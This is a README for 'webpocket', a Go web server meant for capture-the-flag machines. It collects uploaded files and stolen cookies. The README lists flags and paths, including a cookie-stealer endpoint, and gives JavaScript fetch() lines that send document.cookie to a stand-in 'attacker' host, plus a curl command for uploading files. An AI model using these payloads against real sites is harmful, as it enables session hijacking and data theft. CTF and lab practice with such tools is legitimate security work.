# webpocket

Your online five finger discount!

A simple webserver you can send files or cookies to. I wrote it specifically for machines on HTB, THM etc.

## Usage:

### CLI arguments

```plaintext=
-h           Help
-a <address> Address to listen on
-p <port>    Specify the port, which the server should run on. Default: 6969
-s <size>    Max file size. Default: ~33MB
-k           Killswitch, server shuts down after receiving a file
-q           Suppress output

-c           Activate cookiestealer
-cl          Output file for cookielog. -c needs to be provided. Default: cookielog.txt

-b           Activate request bin
-bl          Output file for request bin. -b needs to be provided. Default: requestlog.txt

-fs          Activate file server
-fspath      Path for file server. Default: ./

-tls         Activate tls for the server
-cert        Path to cert (.pem)
-key         Path to cert key (.pem)

-auth        Activate HTTP Basic Auth for file upload. Needs -authuser and -authpass
-authuser    Username for HTTP Basic Auth
-authpass    Password for HTTP Basic Auth
```

### Paths

| Path | Function | Flag |
| ---- | -------- | ---- |
| /f   | File upload | `none` |
| /fs  | File server | `-fs` |
| /c   | Cookie stealer | `-c` |
| /b   | Request bin | `-b` |

### Send data

**POST**

```bash=
curl -X POST --form "data=@/path/to/file" http://<server-ip>:6969/f
```

**Cookies via POST**

```js=
fetch('http://attacker/c', {method: "POST", mode: "no-cors", body: document.cookie})
```

**Cookies via GET**

```js=
fetch('http://attacker/c?'+document.cookie.trim().replace("; ", "&"), {method: "GET", mode: "no-cors"})
```


## Building

```bash=
git clone https://github.com/hobirst/webpocket
cd webpocket
go build .
mv webpocket <somewhere/in/$PATH>
```

## Contributions

Yes please
